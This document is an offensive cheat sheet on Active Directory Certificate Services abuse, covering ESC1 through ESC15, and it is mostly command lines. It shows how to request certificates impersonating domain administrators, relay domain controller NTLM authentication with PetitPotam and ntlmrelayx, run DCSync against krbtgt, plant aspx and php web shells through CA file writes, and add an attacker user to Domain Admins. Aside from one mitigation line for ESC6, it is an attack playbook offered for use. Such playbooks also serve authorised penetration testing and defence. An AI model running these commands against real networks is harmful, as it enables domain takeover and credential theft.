# Active Directory - Certificate ESC Attacks

## ESC1 - Misconfigured Certificate Templates

> Domain Users can enroll in the **VulnTemplate** template, which can be used for client authentication and has **ENROLLEE_SUPPLIES_SUBJECT** set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.

**Requirements**

* Template that allows for AD authentication
* **ENROLLEE_SUPPLIES_SUBJECT** flag
* [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)

**Exploitation**

* Use [Certify.exe](https://github.com/GhostPack/Certify) to see if there are any vulnerable templates

    ```ps1
    Certify.exe find /vulnerable
    Certify.exe find /vulnerable /currentuser
    # or
    PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
    # or
    certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound
    # or
    python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'
    ```

* Use Certify, [Certi](https://github.com/eloypgz/certi) or [Certipy](https://github.com/ly4k/Certipy) to request a Certificate and add an alternative name (user to impersonate)

    ```ps1
    # request certificates for the machine account by executing Certify with the "/machine" argument from an elevated command prompt.
    Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
    certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
    certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
    ```

* Use OpenSSL and convert the certificate, do not enter a password

    ```ps1
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    ```

* Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus

    ```ps1
    Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
    ```

**WARNING**: These certificates will still be usable even if the user or computer resets their password!

**NOTE**: Look for **EDITF_ATTRIBUTESUBJECTALTNAME2**, **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**, **ManageCA** flags, and NTLM Relay to AD CS HTTP Endpoints.

## ESC2 - Misconfigured Certificate Templates

**Requirements**

* Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)

**Exploitation**

* Find template

  ```ps1
  PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
  # or
  python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'
  ```

* Request a certificate specifying the `/altname` as a domain admin like in [ESC1](#esc1---misconfigured-certificate-templates).

## ESC3 - Misconfigured Enrollment Agent Templates

> ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users

* Request a certificate based on the vulnerable certificate template ESC3.

  ```ps1
  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
  [*] Saved certificate and private key to 'john.pfx'
  ```

* Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user

  ```ps1
  certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
  ```

## ESC4 - Access Control Vulnerabilities

> Enabling the `mspki-certificate-name-flag` flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability

* Search for `WriteProperty` with value `00000000-0000-0000-0000-000000000000` using [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate)

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl
  ```

* Add the `ENROLLEE_SUPPLIES_SUBJECT` (ESS) flag to perform ESC1

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag

  # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. 
  C:\>StandIn.exe --adcs --filter WebServer --ess --add
  ```

* Perform ESC1 and then restore the value

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
  ```

Using Certipy

```ps1
# overwrite the configuration to make it vulnerable to ESC1
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
# request a certificate based on the ESC4 template, just like ESC1.
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
# restore the old configuration
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
```

## ESC5 - Vulnerable PKI Object Access Control

> Escalate the privileges from **Domain Administrator** in the child domain into **Enterprise Administrator** at the forest root.

**Requirements**:

* Add new templates to the "Certificate" Templates container
* "WRITE" access to the `pKIEnrollmentService` object

**Exploitation**:

* Use `PsExec` to launch `mmc` as SYSTEM on the child DC: `psexec.exe /accepteula -i -s mmc`
* Connect to "Configuration naming context" > "Certificate Template" container
* Open `certsrv.msc` as SYSTEM and duplicate an existing template
* Edit the properties of the template to:
    * Granting enroll rights to a principal we control in the child domain.
    * Including Client Authentication in the Application Policies.
    * Allowing SANs in certificate requests.
    * Not enabling manager approval or authorized signatures.
* Publish the certificate template to the CA
    * Publish by adding the template to the list in `certificateTemplate` property of `CN=Services`>`CN=Public Key Services`>`CN=Enrollment Services`>`pkiEnrollmentService`
* Finally use the ESC1 vulnerability introduced in the duplicated template to issue a certificate impersonating an Enterprise Administrator.

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

> If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.

**Exploitation**

* Use [Certify.exe](https://github.com/GhostPack/Certify) to check for **UserSpecifiedSAN** flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.

    ```ps1
    Certify.exe cas
    ```

* Request a certificate for a template and add an altname, even though the default `User` template doesn't normally allow to specify alternative names

    ```ps1
    .\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin
    ```

**Mitigation**

* Remove the flag: `certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`

## ESC7 - Vulnerable Certificate Authority Access Control

**Exploitation**

* Detect CAs that allow low privileged users the `ManageCA`  or `Manage Certificates` permissions

    ```ps1
    Certify.exe find /vulnerable
    ```

* Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)

    ```ps1
    Certify.exe setconfig /enablesan /restart
    ```

* Request the certificate with the desired SAN.

    ```ps1
    Certify.exe request /template:User /altname:super.adm
    ```

* Grant approval if required or disable the approval requirement

    ```ps1
    # Grant
    Certify.exe issue /id:[REQUEST ID]
    # Disable
    Certify.exe setconfig /removeapproval /restart
    ```

Alternative exploitation from **ManageCA** to **RCE** on ADCS server:

```ps1
# Get the current CDP list. Useful to find remote writable shares:
Certify.exe writefile /ca:SERVER\ca-name /readonly

# Write an aspx shell to a local web directory:
Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx

# Write the default asp shell to a local web directory:
Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp

# Write a php shell to a remote web directory:
Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
```

## ESC8 - Web Enrollment Relay

> An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.

Require [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pull/1101) PR #1101

* **Version 1**: NTLM Relay + Rubeus + PetitPotam

  ```powershell
  impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
  # For a member server or workstation, the template would be "Computer".
  # Other templates: workstation, DomainController, Machine, KerberosAuthentication

  # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
  # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
  git clone https://github.com/topotam/PetitPotam
  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
  python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
  python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
  python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local

  # Use the certificate with rubeus to request a TGT
  Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
  Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt

  # Now you can use the TGT to perform a DCSync
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **Version 2**: NTLM Relay + Mimikatz + Kekeo

  ```powershell
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

  # Mimikatz
  mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth

  # Kekeo
  kekeo> base64 /input:on
  kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt

  # Mimikatz
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **Version 3**: Kerberos Relay

  ```ps1
  # Setup the relay
  sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine

  # Run mitm6
  sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
  ```

* **Version 4**: ADCSPwn - Require `WebClient` service running on the domain controller. By default this service is not installed.

  ```powershell
  https://github.com/bats3c/ADCSPwn
  adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
  adcspwn.exe --adcs cs.pwnlab.local
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local

  # ADCSPwn arguments
  adcs            -       This is the address of the AD CS server which authentication will be relayed to.
  secure          -       Use HTTPS with the certificate service.
  port            -       The port ADCSPwn will listen on.
  remote          -       Remote machine to trigger authentication from.
  username        -       Username for non-domain context.
  password        -       Password for non-domain context.
  dc              -       Domain controller to query for Certificate Templates (LDAP).
  unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
  output          -       Output path to store base64 generated crt.
  ```

* **Version 5**: Certipy ESC8

  ```ps1
  certipy relay -ca 172.16.19.100
  ```

## ESC9 - No Security Extension

**Requirements**

* `StrongCertificateBindingEnforcement` set to `1` (default) or `0`
* Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
* Certificate specifies `Any Client` authentication EKU
* `GenericWrite` over any account A to compromise any account B

**Scenario**

<John@corp.local> has **GenericWrite** over <Jane@corp.local>, and we want to compromise <Administrator@corp.local>.
<Jane@corp.local> is allowed to enroll in the certificate template ESC9 that specifies the **CT_FLAG_NO_SECURITY_EXTENSION** flag in the **msPKI-Enrollment-Flag** value.

* Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)

    ```ps1
    certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
    ```

* Change the **userPrincipalName** of Jane to be Administrator. :warning: leave the `@corp.local` part

    ```ps1
    certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
    ```

* Request the vulnerable certificate template ESC9 from Jane's account.

    ```ps1
    certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
    # userPrincipalName in the certificate is Administrator 
    # the issued certificate contains no "object SID"
    ```

* Restore userPrincipalName of Jane to <Jane@corp.local>.

    ```ps1
    certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
    ```

* Authenticate with the certificate and receive the NT hash of the <Administrator@corp.local> user.

    ```ps1
    certipy auth -pfx administrator.pfx -domain corp.local
    # Add -domain <domain> to your command line since there is no domain specified in the certificate.
    ```

## ESC11 - Relaying NTLM to ICPR

> Encryption is not enforced for ICPR requests and Request Disposition is set to Issue.

Requirements:

* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy fork
* [sploutchy/impacket](https://github.com/sploutchy/impacket) - Impacket fork

Exploitation:

1. Look for `Enforce Encryption for Requests: Disabled` in `certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout` output
2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.

    ```ps1
    ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
    ```

## ESC12 - ADCS CA on YubiHSM

> The ESC12 vulnerability occurs when a Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password) to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server to recover the private key.

**Requirements**:

* CA certificate
* Shell access on the root CA server

**Exploitation**:

* Generate a certicate for the user

  ```ps1
  certipy req -target dc-esc.esc.local -dc-ip 10.10.10.10 -u "user_esc12@esc.local" -p 'P@ssw0rd' -template User -ca <CA-Common-Name>
  certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
  certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
  ```

* Importing the CA certificate into the user store

  ```ps1
  certutil -addstore -user my .\Root-CA-5.cer
  ```

* Associated with the private key in the YubiHSM2 device

  ```ps1
  certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA-Common-Name>
  ```

* Sign `user_esc12.crt` and specify a `Subject Alternative Name` using the `extension.inf` file.

  ```ps1
  certutil -sign ./user_esc12.crt new.crt @extension.inf
  ```

* Content of extension.inf

  ```cs
  [Extensions]
  2.5.29.17 = "{text}"
  _continue_ = "UPN=Administrator@esc.local&"
  ```

* Use the certificate to get the TGT of the Administrator

  ```ps1
  openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx
  Rubeus.exe asktgt /user:Administrator /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap
  ```

Unlocking the YubiHSM with the plaintext password in the registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

## ESC13 - Issuance Policy

> If a principal (user or computer) has enrollment rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group link.

**Requirements**

* The principal has enrollment rights on a certificate template
* The certificate template has an issuance policy extension
* The issuance policy has an OID group link to a group
* The certificate template defines EKUs that enable client authentication

```ps1
PS C:\> $ESC13Template = Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties nTSecurityDescriptor $ESC13Template.nTSecurityDescriptor.Access | ? {$_.IdentityReference -eq "DUMPSTER\ESC13User"}
AccessControlType     : Allow

# check if there is an issuance policy in the msPKI-Certificate-Policy
PS C:\> Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties msPKI-Certificate-Policy
msPKI-Certificate-Policy : {1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448}

# check for OID group link
PS C:\> Get-ADObject "CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
msDS-OIDToGroupLink     : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire

# verify if ESC13Group is a Universal group
PS C:\> Get-ADGroup ESC13Group -Properties Members
GroupScope        : Universal
Members           : {}
```

**Exploitation**:

* Find a vulnerable template

  ```ps1
  certipy find -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -stdout -vulnerable
  ```

* Request a certificate for the vulnerable template

  ```ps1
  .\Certify.exe request /ca:DC01\dumpster-DC01-CA /template:ESC13Template
  certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -template <ESC13-Template> -ca <CA-NAME>
  ```

* Merge into a PFX file

  ```ps1
  certutil -MergePFX .\esc13.pem .\esc13.pfx
  ```

* Verify the presence of the "Client Authentication" and the "Policy Identifier"

  ```ps1
  certutil -Dump -v .\esc13.pfx
  ```

* Pass-The-Certificate: Ask a TGT for our user, but we are also member of the linked group and inherited their privileges

  ```ps1
  Rubeus.exe asktgt /user:ESC13User /certificate:C:\esc13.pfx /nowrap
  Rubeus.exe asktgt /user:username /certificate:username.pfx /domain:lab.local /dc:dc /nowrap
  ```

* Pass-The-Ticket: Use the ticket that grant privileges from the AD group

  ```ps1
  Rubeus.exe ptt /ticket:<ticket>
  ```

## ESC14 - altSecurityIdentities

> ESC14 is an Active Directory Certificate Services (ADCS) abuse technique that leverages the altSecurityIdentities attribute to perform explicit certificate mappings. This attribute allows administrators to associate specific certificates with user or computer accounts for authentication purposes. However, if an attacker gains write access to this attribute, they can add a mapping to a certificate they control, effectively impersonating the targeted account.

Domain administrators can manually associate certificates with a user in Active Directory by configuring the altSecurityIdentities attribute of the user object. This attribute supports six different values, categorized into three weak (insecure) mappings and three strong mappings.

In general, a mapping is considered strong if it relies on unique, non-reusable identifiers. Conversely, mappings based on usernames or email addresses are classified as weak, as these identifiers can be easily reused or changed.

| Mapping                | Example                            | Type   | Remarks       |
| ---------------------- | ---------------------------------- | ------ | ------------- |
| X509IssuerSubject      | `X509:<I>IssuerName<S>SubjectName` | Weak   | /             |
| X509SubjectOnly        | `X509:<S>SubjectName`              | Weak   | /             |
| X509RFC822             | `X509:<RFC822>user@contoso.com`    | Weak   | Email Address |
| X509IssuerSerialNumber | `X509:<I>IssuerName<SR>1234567890` | Strong | Recommended   |
| X509SKI                | `X509:<SKI>123456789abcdef`        | Strong | /             |
| X509SHA1PublicKey      | `X509:<SHA1-PUKEY>123456789abcdef` | Strong | /             |

**Requirements**:

* Ability to modify the attribute `altSecurityIdentitites` of an account.

**Exploitation**:

**Technique 1** with [GhostPack/Certify](https://github.com/GhostPack/Certify) and [logangoins/Stifle](https://github.com/logangoins/Stifle)

```ps1
# the certificate requested must be a machine account certificate
Certify.exe request /ca:lab.lan\lab-dc01-ca /template:Machine /machine

# convert to base64 .pfx format:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export | base64 -w 0

# generate a certificate mapping string and write it to the target objects altSecurityIdentities attribute:
Stifle.exe add /object:target /certificate:MIIMrQI... /password:P@ssw0rd

# request a TGT using PKINIT authentication, effectively impersonating the target user with Rubeus:
Rubeus.exe asktgt /user:target /certificate:MIIMrQI... /password:P@ssw0rd
```

**Technique 2** using [Deloitte-OffSecResearch/Certipy](https://github.com/Deloitte-OffSecResearch/Certipy) and [JonasBK/Add-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1)

```ps1
# request a machine account certificate
addcomputer.py -method LDAPS -computer-name 'ESC13$' -computer-pass 'P@ssw0rd' -dc-host dc.lab.local 'lab.local/kuma'
certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "ESC13$@lab.local" -p 'P@ssw0rd' -template Machine -ca LAB-CA

# extract Serial Number and Issuer, to configure a strong mapping
certutil -Dump -v .\esc13.pfx
Get-X509IssuerSerialNumberFormat -SerialNumber "<serial-number>" -IssuerDistinguishedName "<issuer-cn>"

# add mapping to the Administrator user
Add-AltSecIDMapping -DistinguishedName "CN=Administrator,CN=Users,DC=lab,DC=local" -MappingString "<output-x509-issuer-serial-number>"

# request TGT for Administrator
Rubeus.exe asktgt /user:Administrator /certificate:esc13.pfx /domain:lab.local /dc:dc.lab.local /show /nowrap
```

## ESC15 - EKUwu Application Policies - CVE-2024-49019

This technique now has a CVE number and was patched on November 12, See [Active Directory Certificate Services Elevation of Privilege Vulnerability - CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019) for more information.

**Requirements**:

* **Template Schema** Version 1
* **ENROLLEE_SUPPLIES_SUBJECT** = `True`

**Exploitation**:

Detect the vulnerability from BloodHound data using the following cypher query.

```ps1
MATCH p=(:Base)-[:MemberOf*0..]->()-[:Enroll|AllExtendedRights]->(ct:CertTemplate)-[:PublishedTo]->(:EnterpriseCA)-[:TrustedForNTAuth]->(:NTAuthStore)-[:NTAuthStoreFor]->(:Domain) WHERE ct.enrolleesuppliessubject = True AND ct.authenticationenabled = False AND ct.requiresmanagerapproval = False AND ct.schemaversion = 1 RETURN p
```

The **Application Policies** extension is a proprietary certificate extension with the OID `1.3.6.1.4.1.311`, same as **x509 EKUs**. It was designed to allow users to specify additional use cases for certificates by utilizing the same OIDs as those in the Enhanced Key Usage extension.
If there is a conflict between an Application Policy and an EKU, then Microsoft prefers the proprietary Application Policy.

> "Application policy is Microsoft specific and is treated much like Extended Key Usage. If a certificate has an extension containing an application policy and also has an EKU extension, the EKU extension is ignored." - Microsoft

When a user requests a certificate based on a schema version 1 template and includes an application policy, the policy is incorporated into the certificate. This allows users to specify arbitrary EKUs, bypassing the requirements for ESC2.

**ESC1** - The WebServer template is enabled by default in ADCS, requires a user-supplied SAN and only has the `Server Authentication` EKU. Using [ly4k/Certipy PR #228](https://github.com/ly4k/Certipy/pull/228), we can add the `Client Authentication` EKU to `WebServer`. Anybody with the `Enroll` permission on this template can now compromise the domain.

```ps1
certipy req -dc-ip 10.10.10.10 -ca CA -target-ip 10.10.10.11 -u user@domain.com -p 'P@ssw0rd' -template WebServer -upn Administrator@domain.com --application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# in LDAP shell
add_user pentest_user
add_user_to_group pentest_user "Domain Admins"
```

**ESC2/ESC3** - **Certificate Request Agent** (`1.3.6.1.4.1.311.20.2.1`),

```ps1
certipy -req -u user@domain.com -p 'P@ssw0rd' --application-policies "1.3.6.1.4.1.311.20.2.1" -ca "Lab Root CA" -template WebServer -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy -req -u user@domain.com -p 'P@ssw0rd' -on-behalf-of DOMAIN\\Administrator -Template User -ca "Lab Root CA" -pfx user.pfx -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## References

* [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
* [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
* [ADCS ESC13 Abuse Technique - Jonas Bülow Knudsen - 02/15/2024](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
* [ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - 02/01/2024](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
* [ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - February 28, 2024](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
* [ADCS Exploitation Part 2: Certificate Mapping + ESC15 - Giulio Pierantoni - Oct 10, 2024](https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760)
* [ADCS: Playing with ESC4 - Matthew Creel](https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4)
* [Curious case of AD CS ESC15 vulnerable instance and its manual exploitation - Mannu Linux - February 13, 2025](https://www.mannulinux.org/2025/02/Curious-case-of-AD-CS-ESC15-vulnerable-instance-and-its-manual-exploitation.html)
* [EKUwu: Not just another AD CS ESC - Justin Bollinger - October 08, 2024](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
* [ESC12 – Shell access to ADCS CA with YubiHSM - hajo - October 2023](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
* [ESC15/EKUwu PR #228 - dru1d-foofus - 10/08/2024](https://github.com/ly4k/Certipy/pull/228)
* [Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
* [From DA to EA with ESC5 - Andy Robbins - May 16, 2023](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)
* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
